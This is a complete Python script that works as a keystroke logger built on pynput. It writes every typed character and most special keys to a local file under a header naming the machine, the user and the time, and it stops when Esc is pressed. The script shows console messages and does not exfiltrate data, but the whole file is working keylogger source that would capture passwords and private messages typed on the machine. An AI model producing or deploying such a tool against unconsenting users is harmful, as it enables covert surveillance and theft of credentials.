import pynput.keyboard
import datetime
import socket
import getpass
import os

# --- Configuration ---
LOG_FILE = "keylog.txt"
SEPARATOR = "*" * 30 # Separator line
# -------------------

def get_header():
    """Gets machine name, username, and current date/time for the log header."""
    hostname = socket.gethostname()
    username = getpass.getuser()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f"--- Log Start ---\nMachine: {hostname}\nUser: {username}\nDate: {now}\n-----------------"

def on_press(key):
    """Callback function executed when a key is pressed."""
    try:
        # For normal characters
        char = key.char
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(char)
    except AttributeError:
        # For special keys (e.g., Shift, Ctrl, Space, Enter, Esc)
        key_name = str(key).replace('Key.', '') # Make special key names more readable
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            # Add spaces around special keys for better readability
            if key_name == 'space':
                f.write(' ')
            elif key_name == 'enter':
                f.write('\n') # New line for Enter
            elif key_name == 'backspace':
                 f.write('[BACKSPACE]') # Indicate backspace explicitly
            # Ignore modifier keys like shift, ctrl, alt by themselves for cleaner log
            elif key_name not in ['shift', 'shift_r', 'ctrl_l', 'ctrl_r', 'alt_l', 'alt_gr', 'cmd', 'cmd_r']:
                 f.write(f'[{key_name.upper()}]') # Log other special keys in uppercase

def on_release(key):
    """Callback function executed when a key is released."""
    if key == pynput.keyboard.Key.esc: # Stop listener if Esc is pressed
        print("\nArrêt de l'enregistrement (Échap pressé).")
        # Write a final separator to clearly mark the end of this session's log
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f'\n{SEPARATOR}\n--- Log End ---\n{SEPARATOR}\n\n')
        return False # Stop the listener

def main():
    """Main function to start the keylogger."""
    print(f"Démarrage de l'enregistrement des frappes dans '{LOG_FILE}'...")
    print("Appuyez sur 'Échap' (Esc) pour arrêter.")

    # Write header information to the log file at the start of a new session
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f'{SEPARATOR}\n')
        f.write(f'{get_header()}\n')
        f.write(f'{SEPARATOR}\n')

    # Start listening for keyboard events
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() # Keep the listener running until stopped

if __name__ == "__main__":
    # Check if the log file exists, create if not (ensures directory exists)
    if not os.path.exists(os.path.dirname(LOG_FILE)) and os.path.dirname(LOG_FILE) != '':
        os.makedirs(os.path.dirname(LOG_FILE))
    # Create the file if it doesn't exist to ensure correct permissions later
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        pass 
    main()
